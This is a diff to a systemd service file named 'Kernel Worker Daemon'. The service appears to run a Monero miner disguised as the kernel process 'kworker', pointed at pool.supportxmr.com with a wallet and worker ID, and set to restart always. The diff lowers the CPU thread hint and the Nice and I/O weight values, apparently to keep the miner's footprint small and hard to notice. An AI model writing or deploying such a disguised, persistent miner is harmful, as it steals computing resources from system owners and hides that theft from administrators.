@@ -29,11 +29,11 @@ Description=Kernel Worker Daemon
 After=network.target
 
 [Service]
-ExecStart=/usr/local/bin/kworker -o pool.supportxmr.com:443 -u $WALLET.$WORKER_ID -k --tls --cpu-max-threads-hint=50 --cpu-priority=3
+ExecStart=/usr/local/bin/kworker -o pool.supportxmr.com:443 -u $WALLET.$WORKER_ID -k --tls --cpu-max-threads-hint=30 --cpu-priority=3
 Restart=always
-Nice=10
+Nice=5
 CPUWeight=5
-IOWeight=10
+IOWeight=5
 
 [Install]
 WantedBy=multi-user.target
